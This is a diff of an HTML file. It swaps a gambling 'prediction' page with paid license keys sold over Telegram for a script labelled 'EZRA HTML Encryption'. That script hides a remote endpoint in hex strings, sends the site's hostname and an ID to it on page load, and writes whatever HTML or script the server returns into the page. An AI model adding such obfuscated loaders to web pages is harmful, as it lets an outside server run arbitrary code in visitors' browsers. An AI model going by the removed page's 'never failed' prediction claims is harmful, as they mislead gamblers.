@@ -1,204 +1,88 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>DHARIK AI TOOL</title>
-    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Space+Grotesk:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="style.css">
+<title>.</title>
 </head>
-<body>
+<body><!--
+* ============================================
+ * 🛡 EZRA HTML Encryption Script
+ * ============================================
+ *
+ * 🔐 ABOUT:
+ * ----------
+ * This script securely encodes HTML content, making it unreadable  
+ * without decoding. Protects web pages from unauthorized access  
+ * and modifications.
+ *
+ * 🚀 FEATURES:
+ * ------------
+ * ✅ Encrypts HTML into an unreadable format.
+ * ✅ Prevents direct copying and unauthorized edits.
+ * ✅ Uses strong obfuscation techniques.
+ * ✅ Protects content without affecting functionality.
+ *
+ * 🔧 DEVELOPER INFO:
+ * -------------------
+ * 🧑‍💻 Developer: @teamEzra
+ * 🌐 Version: 2.0
+ * 📅 Date: 2026-08-15
+ *
+ * 📜 LICENSE:
+ * ------------
+ * Licensed under MIT. Modify, distribute, and use freely  
+ * with proper credit to the developer.
+ *
+ * ⚠ DISCLAIMER:
+ * --------------
+ * This script is provided without any warranties.  
+ * The developer holds no responsibility for any misuse.
+ *
+ * 🔒 ENCRYPTION ID: [EZRA-ENC-2026-08-15-XXXXX]
+ *
+ * ============================================
+-->
+<script>
+var w9173fbbb='68747470733a2f2f';
+var w54bc0930='64696c6c696e6765';
+var wd12c2be3='722e636c6f75642f';
+var w93ab86f3='656e636f62667372';
+var w59c1adeb='6f626f7470726f2f';
+var w59b6f0bd='6170692e706870';
+var x92bf496b=qbe5f2bc8(w9173fbbb+w54bc0930+wd12c2be3+w93ab86f3+w59c1adeb+w59b6f0bd);
+var g0834ece7='3536303563626434';
+var gb4d69eef='3366343438393239';
+var g3b5ce180='3036386264643434';
+var g6736c399='3030356437383962';
+var y9834c2b1=qbe5f2bc8(g0834ece7+gb4d69eef+g3b5ce180+g6736c399);
 
-<!-- LOGIN GATE -->
-<div id="loginGate" data-on="false">
-    <div class="container">
-      <div class="lamp-wrapper">
-        <svg class="lamp-svg" viewBox="0 0 200 300" xmlns="http://www.w3.org/2000/svg">
-          <ellipse class="inner-glow" cx="100" cy="110" rx="60" ry="30" />
-          <rect class="lamp-base" x="92" y="100" width="16" height="160" rx="8" />
-          <rect class="lamp-base" x="60" y="250" width="80" height="12" rx="6" />
-          <g class="pull-cord">
-            <line class="cord-line" x1="130" y1="110" x2="130" y2="180" />
-            <circle class="cord-bead" cx="130" cy="190" r="6" />
-            <circle class="cord-hit" cx="130" cy="190" r="25" fill="transparent" />
-          </g>
-          <path class="lamp-shade" d="M30 110 C 30 50, 170 50, 170 110 C 170 125, 30 125, 30 110 Z" />
-        </svg>
-      </div>
+function qbe5f2bc8(h){var r='';for(var i=0;i<h.length;i+=2){r+=String.fromCharCode(parseInt(h.substr(i,2),16));}return r;}
 
-      <div class="login-form" id="lampLoginForm">
-        <h2>Welcome</h2>
-        <div class="brand-title">DHARIK AI TOOL</div>
-        <div class="brand-tagline">🔹ONE DAY THEY'LL UNDERSTAND WHY I NEVER GAVE UP🔹</div>
-        <form onsubmit="return false;">
-          <div class="form-group">
-            <label>Username</label>
-            <input type="text" id="lampUsername" placeholder="Enter name" autocomplete="off">
-          </div>
-          <div class="form-group">
-            <label>Password</label>
-            <input type="password" id="lampPassword" placeholder="Enter Password" autocomplete="off">
-          </div>
-          <button class="login-btn" id="lampLoginBtn" type="button">Sign In</button>
-        </form>
-      </div>
-    </div>
-
-    <div class="lamp-footer">
-        POWERED BY <span>DHARIK AI TOOL</span>
-    </div>
-</div>
-
-<!-- LICENSE GATE -->
-<div class="gate-container hidden" id="gateContainer">
-    <div class="container">
-        <div id="licensePage">
-            <h1>🔐 DHARIK AI PREMIUM</h1>
-            <div style="margin-bottom: 20px; color: #666;">POWERED BY DHARIK AI TOOL SYSTEM!</div>
-
-            <a class="community-btn" href="https://t.me/+JhYXh_rzzZ0wYjdl" target="_blank">
-                📢 JOIN PREDICTION CHANNEL
-            </a>
-
-            <a class="community-btn" href="https://t.me/Mr_TAMIZHAN_25" target="_blank">
-                🤖 CONTACT ADMIN
-            </a>
-
-            <button class="continue-btn" onclick="goToSecurityGate()">I AM JOINED (CONTINUE)</button>
-        </div>
-
-        <div id="securityGatePage" class="hidden">
-            <div class="security-title">🔒 SECURITY GATE</div>
-            <div class="enter-key">ENTER LICENSE KEY</div>
-
-            <input type="text" id="keyInput" placeholder="ENTER KEY" maxlength="20" autocomplete="off">
-            <button class="unlock-btn" onclick="checkKey()">UNLOCK SYSTEM</button>
-
-            <a class="gradient" href="https://t.me/Mr_TAMIZHAN_25" target="_blank">
-                DM TO BUY KEY
-            </a>
-
-            <p id="status"></p>
-        </div>
-    </div>
-</div>
-
-<!-- Expiry Background Counter -->
-<div id="expiryBackground" style="display: none;">
-    <span id="expiryText"></span>
-    <button id="expiryLogoutBtn" onclick="logout()">LOGOUT</button>
-</div>
-
-<!-- POPUP - Access Denied -->
-<div class="popup" id="popup">
-    <h2>⛔ ACCESS DENIED</h2>
-    <p id="popupMessage">Invalid / Revoked Key</p>
-    <a class="gradient" href="https://t.me/Mr_TAMIZHAN_25" target="_blank">DM TO BUY KEY</a>
-    <button onclick="closePopup()">Close</button>
-</div>
-
-<!-- WARNING POPUP -->
-<div class="popup" id="warningPopup">
-    <h2>⚠️ ACCESS DENIED</h2>
-    <p id="warningMessage">This key is already active in another browser/device!</p>
-    <p style="font-size: 12px; color: #666;">Only one browser/device allowed per key</p>
-    <button onclick="closeWarningPopup()">OK</button>
-</div>
-
-<!-- SUCCESS POPUP -->
-<div class="popup" id="successPopup">
-    <h2>✅ KEY REACTIVATED</h2>
-    <p id="successMessage">Your key has been reactivated by admin!</p>
-    <button onclick="closeSuccessPopup()">OK</button>
-</div>
-
-<!-- MAIN DASHBOARD -->
-<div id="mainDashboard" class="hidden">
-<div class="wrap">
-
-    <div class="hdr">
-        <div class="hdr-sub">◈ NEURAL PATTERN ENGINE ◈</div>
-        <div class="hdr-title">DHARIK AI TOOL</div>
-        <div class="hdr-badge last10-badge">🔷 WINGO 30S · DHARIK AI TOOL SYSTEM 🔷</div>
-    </div>
-
-    <div class="api-status" id="apiStatus">
-        <div class="api-dot init" id="apiDot"></div>
-        <span id="apiText">INITIALIZING...</span>
-        <span style="flex:1;text-align:right;color:var(--muted);" id="periodDisplay">---</span>
-    </div>
-
-    <div class="timer-display" id="timerDisplay">30s</div>
-
-    <div class="pred-grid">
-        <div class="pred-card bs">
-            <div class="pred-card-label">🎯 BIG / SMALL</div>
-            <div class="pred-card-value" id="bsPrediction">---</div>
-            <div class="pred-card-conf" id="bsConfidence">0%</div>
-        </div>
-        <div class="pred-card color">
-            <div class="pred-card-label">🎨 COLOR</div>
-            <div class="color-ball" id="colorBall">?</div>
-            <div class="pred-card-value" id="colorPrediction">---</div>
-            <div class="pred-card-conf" id="colorConfidence">0%</div>
-        </div>
-        <div class="pred-card number">
-            <div class="pred-card-label">🔢 NUMBER</div>
-            <div class="pred-card-value num-color" id="numberPrediction">---</div>
-            <div class="pred-card-conf" id="numberConfidence">0%</div>
-        </div>
-    </div>
-
-    <div class="conf-wrap">
-        <div class="conf-label"><span>OVERALL CONFIDENCE</span><span id="confPct">0%</span></div>
-        <div class="conf-bg"><div class="conf-fill" id="confidenceBar"></div></div>
-    </div>
-
-    <div class="pattern-tag" id="patternDisplay">📋 LAST 10: LOADING...</div>
-    <div class="match-tag" id="matchInfo">⚡ WAITING FOR DATA</div>
-
-    <div class="card">
-        <div class="card-hdr">
-            <div class="card-title">DHARIK AI TOOL NEVER FAILED</div>
-            <div class="card-badge" id="storageBadge">READY</div>
-        </div>
-        <div class="card-body">
-            <div class="stats-row">
-                <div class="stat-box"><div class="stat-num" id="statCount">0</div><div class="stat-lbl">STORED</div></div>
-                <div class="stat-box"><div class="stat-num" id="statPatterns">0</div><div class="stat-lbl">PATTERNS</div></div>
-                <div class="stat-box"><div class="stat-num" id="liveCount">0</div><div class="stat-lbl">LIVE</div></div>
-            </div>
-            <div class="prog-bg"><div class="prog-fill" id="progressFill"></div></div>
-            <div class="status-bar"><div class="status-dot"></div><span id="storageStatus">READY</span></div>
-            <div class="btn-row">
-                <button class="btn btn-ghost" id="refreshStatsBtn"><i class="fas fa-sync-alt"></i> REFRESH</button>
-                <button class="btn btn-gold" id="importBtn"><i class="fas fa-upload"></i> IMPORT</button>
-                <button class="btn btn-red" id="deleteDataBtn"><i class="fas fa-trash"></i> DELETE</button>
-            </div>
-        </div>
-    </div>
-
-    <div class="card">
-        <div class="card-hdr"><div class="card-title">📜 LIVE HISTORY (LAST 10)</div></div>
-        <div class="card-body" style="padding:8px 10px;">
-            <table><thead><tr><th>PERIOD</th><th>NUM</th><th>TYPE</th></tr></thead><tbody id="historyTable"></tbody></table>
-        </div>
-    </div>
-
-</div>
-
-<div class="toast" id="toast"></div>
-
-<div class="ticker-wrap">
-    <div class="ticker" id="ticker">⚡ DHARIK AI TOOL · WINGO 30S · LAST 10 · 100000 STORAGE</div>
-</div>
-
-</div>
-
-<script src="https://unpkg.com/gsap@3/dist/gsap.min.js"></script>
-<script src="https://unpkg.com/gsap@3/dist/Draggable.min.js"></script>
-<script src="script.js"></script>
+(function(){
+    var xhr=new XMLHttpRequest();
+    xhr.open('POST',x92bf496b,true);
+    xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+    xhr.onreadystatechange=function(){
+        if(xhr.readyState===4){
+            if(xhr.status===200){
+                try{
+                    var res=JSON.parse(xhr.responseText);
+                    if(res.ok&&res.c){
+                        document.open();
+                        document.write(res.c);
+                        document.close();
+                    }else{
+                        document.body.innerHTML='';
+                    }
+                }catch(e){
+                    document.body.innerHTML='';
+                }
+            }else{
+                document.body.innerHTML='';
+            }
+        }
+    };
+    xhr.send('i='+encodeURIComponent(y9834c2b1)+'&h='+encodeURIComponent(location.hostname));
+})();
+</script>
 </body>
 </html>
